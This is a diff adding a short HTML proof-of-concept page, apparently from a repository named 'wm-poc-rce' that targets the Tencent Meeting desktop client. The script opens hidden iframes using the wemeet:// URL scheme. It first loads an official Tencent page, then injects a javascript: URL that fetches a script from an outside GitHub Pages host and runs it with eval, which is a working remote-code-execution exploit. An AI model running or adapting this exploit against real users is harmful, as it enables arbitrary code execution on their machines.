@@ -1,0 +1,18 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P65</title></head>
+<body><h1>P65</h1>
+<script>
+document.title='P65-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var js="javascript:void(fetch('https://gitwhs.github.io/wm-poc-rce/p65.js').then(function(r){return r.text()}).then(eval))";
+function frame(src,label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P65-TB'); }, 500);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(js),'P65-JSINJ'); }, 12000);
+setTimeout(function(){ document.title='P65-WAIT'; }, 28000);
+</script>
+</body></html>
